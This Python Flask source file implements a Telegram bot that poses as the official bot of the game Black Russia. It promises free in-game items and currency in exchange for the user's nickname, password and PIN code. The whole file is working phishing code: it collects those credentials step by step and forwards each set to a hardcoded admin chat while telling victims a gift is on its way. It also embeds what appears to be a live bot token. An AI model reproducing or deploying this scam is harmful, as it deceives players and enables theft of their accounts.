from flask import Flask, request
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8828199468:AAEh0DC2_g9swwiCoNc080AmQK11qyNrOiE"
ADMIN_CHAT_ID = "8625787020"

# === ФАЙЛЫ ===
USERS_FILE = "users.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

# Храним состояния пользователей
user_state = {}

# === ТЕКСТЫ ===
WELCOME = (
    "🎁 *BLACK RUSSIA — ОФИЦИАЛЬНЫЙ БОТ*\n\n"
    "▸ Здесь ты можешь получить бесплатные подарки от Black Russia.\n"
    "▸ Выбери действие ниже."
)

ABOUT = (
    "ℹ️ *О боте*\n\n"
    "Это официальный бот для выдачи бесплатных подарков от Black Russia.\n\n"
    "🔹 *Что можно получить?*\n"
    "▸ 🎁 Особый кейс\n"
    "▸ 💳 10 000 000 виртов\n\n"
    "🔹 *Как получить?*\n"
    "▸ Выберите подарок → укажите сервер → введите данные аккаунта.\n"
    "▸ Дождитесь выдачи (10–30 минут).\n\n"
    "🔹 *Важно:*\n"
    "▸ Бот работает автоматически.\n"
    "▸ Все данные защищены."
)

SELECT_SERVER = "🌍 *Выберите ваш сервер:*\n\nНиже список доступных серверов."
ENTER_LOGIN = "👤 *Введите ваш НИК в Black Russia:*"
ENTER_PASSWORD = "🔑 *Введите ваш ПАРОЛЬ от аккаунта:*"
ENTER_PIN = "🔐 *Введите ваш 4-значный ПИН-КОД (если есть):*\n\nИли нажмите «Нет кода»."
WAITING = "⏳ *Ожидайте 10–30 минут!*\n\n▸ Вы в очереди на получение подарка.\n▸ Как только подарок будет выдан — вы получите уведомление."
CHOOSE_ACTION = "📌 *Выберите действие:*"

# === СПИСОК СЕРВЕРОВ ===
SERVERS = [
    "RED", "GREEN", "BLUE", "YELLOW", "ORANGE", "PURPLE", "LIME", "PINK",
    "CHERRY", "BLACK", "INDIGO", "WHITE", "MAGENTA", "CRIMSON", "GOLD",
    "AZURE", "PLATINUM", "AQUA", "GRAY", "ICE", "CHILLI", "CHOCO", "MOSCOW",
    "SPB", "UFA", "SOCHI", "KAZAN", "SAMARA", "ROSTOV", "ANAPA", "EKB",
    "KRASNODAR", "ARZAMAS", "NOVOSIBIRSK", "GROZNY", "SARATOV", "OMSK",
    "IRKUTSK", "VOLGOGRAD", "BELGOROD", "VLADIKAVKAZ", "CHELYABINSK",
    "KRASNOYARSK", "CHEBOKSARY", "KHABAROVSK", "PERM", "RYAZAN", "MURMANSK",
    "PENZA", "KURSK", "ORENBURG", "KIROV", "TOLYATTI", "BRATSK", "ASTRAKHAN",
    "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN", "CHEREPOVETS", "NORILSK", "ASTANA"
]

# === КЛАВИАТУРЫ ===
MAIN_KEYBOARD = {
    "keyboard": [
        ["🎁 Получить особый кейс", "💳 Получить 10кк виртов"],
        ["ℹ️ О боте"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

def build_server_keyboard():
    buttons = []
    row = []
    for i, server in enumerate(SERVERS):
        row.append(server)
        if len(row) == 3 or i == len(SERVERS)-1:
            buttons.append(row)
            row = []
    buttons.append(["🔙 Назад"])
    return {"keyboard": buttons, "resize_keyboard": True, "one_time_keyboard": False}

BACK_KEYBOARD = {
    "keyboard": [
        ["🔙 Назад"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

PIN_KEYBOARD = {
    "keyboard": [
        ["🔐 Ввести пин-код"],
        ["❌ Нет кода"],
        ["🔙 Назад"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    global user_state
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']

        # === АДМИН ===
        if str(chat_id) == ADMIN_CHAT_ID:
            # Если надо — можно добавить команды для админа
            return "ok", 200

        # === ПОЛЬЗОВАТЕЛЬ ===
        save_user(user_id)
        state = user_state.get(str(user_id), {})

        # === НАЗАД ===
        if text == "🔙 Назад":
            user_state[str(user_id)] = {}
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": CHOOSE_ACTION,
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD
                }
            )
            return "ok", 200

        # === ОСНОВНЫЕ КНОПКИ ===
        if text in ["🎁 Получить особый кейс", "💳 Получить 10кк виртов"]:
            action = "case" if "кейс" in text else "virts"
            user_state[str(user_id)] = {"action": action}
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": SELECT_SERVER,
                    "parse_mode": "Markdown",
                    "reply_markup": build_server_keyboard()
                }
            )
            return "ok", 200

        if text == "ℹ️ О боте":
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": ABOUT,
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD
                }
            )
            return "ok", 200

        # === ВЫБОР СЕРВЕРА ===
        if state.get("action") in ["case", "virts"] and text in SERVERS:
            state["server"] = text
            state["step"] = "login"
            user_state[str(user_id)] = state
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": ENTER_LOGIN,
                    "parse_mode": "Markdown",
                    "reply_markup": BACK_KEYBOARD
                }
            )
            return "ok", 200

        # === ЛОГИН ===
        if state.get("step") == "login":
            state["login"] = text
            state["step"] = "password"
            user_state[str(user_id)] = state
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": ENTER_PASSWORD,
                    "parse_mode": "Markdown",
                    "reply_markup": BACK_KEYBOARD
                }
            )
            return "ok", 200

        # === ПАРОЛЬ ===
        if state.get("step") == "password":
            state["password"] = text
            state["step"] = "pin"
            user_state[str(user_id)] = state
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": ENTER_PIN,
                    "parse_mode": "Markdown",
                    "reply_markup": PIN_KEYBOARD
                }
            )
            return "ok", 200

        # === ПИН-КОД ===
        if state.get("step") == "pin":
            if text == "❌ Нет кода":
                pin = "Нет кода"
            elif text == "🔐 Ввести пин-код":
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": chat_id,
                        "text": "✏️ *Введите 4-значный код:*",
                        "parse_mode": "Markdown",
                        "reply_markup": BACK_KEYBOARD
                    }
                )
                state["step"] = "pin_input"
                user_state[str(user_id)] = state
                return "ok", 200
            else:
                pin = text

            # Отправляем данные админу
            data_msg = (
                f"🎁 *НОВЫЙ ЗАПРОС*\n"
                f"─────────────────\n"
                f"👤 Юзернейм: @{username}\n"
                f"🆔 ID: {user_id}\n"
                f"─────────────────\n"
                f"🌍 Сервер: {state.get('server')}\n"
                f"👤 Логин: {state.get('login')}\n"
                f"🔑 Пароль: {state.get('password')}\n"
                f"🔐 Пин-код: {pin if pin else 'Не указан'}"
            )
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": ADMIN_CHAT_ID,
                    "text": data_msg,
                    "parse_mode": "Markdown"
                }
            )

            user_state[str(user_id)] = {}
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": WAITING,
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD
                }
            )
            return "ok", 200

        # === ВВОД 4-ЗНАЧНОГО ПИНА ===
        if state.get("step") == "pin_input":
            if len(text) == 4 and text.isdigit():
                pin = text
                data_msg = (
                    f"🎁 *НОВЫЙ ЗАПРОС*\n"
                    f"─────────────────\n"
                    f"👤 Юзернейм: @{username}\n"
                    f"🆔 ID: {user_id}\n"
                    f"─────────────────\n"
                    f"🌍 Сервер: {state.get('server')}\n"
                    f"👤 Логин: {state.get('login')}\n"
                    f"🔑 Пароль: {state.get('password')}\n"
                    f"🔐 Пин-код: {pin}"
                )
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": data_msg,
                        "parse_mode": "Markdown"
                    }
                )
                user_state[str(user_id)] = {}
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": chat_id,
                        "text": WAITING,
                        "parse_mode": "Markdown",
                        "reply_markup": MAIN_KEYBOARD
                    }
                )
            else:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": chat_id,
                        "text": "⚠️ *Пин-код должен состоять из 4 цифр. Попробуйте снова:*",
                        "parse_mode": "Markdown",
                        "reply_markup": BACK_KEYBOARD
                    }
                )
            return "ok", 200

        # === СТАРТ ===
        if text == '/start':
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": WELCOME,
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD
                }
            )
            return "ok", 200

        # === ВСЁ ОСТАЛЬНОЕ ===
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": CHOOSE_ACTION,
                "parse_mode": "Markdown",
                "reply_markup": MAIN_KEYBOARD
            }
        )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
